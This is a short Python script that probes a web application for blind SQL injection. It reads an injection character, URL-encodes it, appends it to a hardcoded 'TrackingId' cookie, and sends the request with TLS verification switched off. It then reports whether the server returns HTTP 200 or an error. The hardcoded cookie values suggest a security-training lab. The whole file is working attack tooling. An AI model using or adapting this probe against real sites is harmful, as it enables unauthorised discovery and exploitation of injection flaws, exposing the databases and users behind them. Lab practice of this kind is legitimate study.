import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_check(url):
    payload_check_injvunl = str(input("Enter character to check:"))
    sqli_payload_encoded = urllib.parse.quote(payload_check_injvunl)
    cookies = {'TrackingId': 'NPRSM7nDLaJKfzZi' + sqli_payload_encoded, 'session': '84IYOy9d87jcZd8CcnABdNgbDgFUo1Oy'}
    r = requests.get(url, cookies=cookies, verify=False)
    if r.status_code == 200:
        print("Successful responses")
    else:
        print("Error responses")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    sqli_check(url)


if __name__ == "__main__":
    main()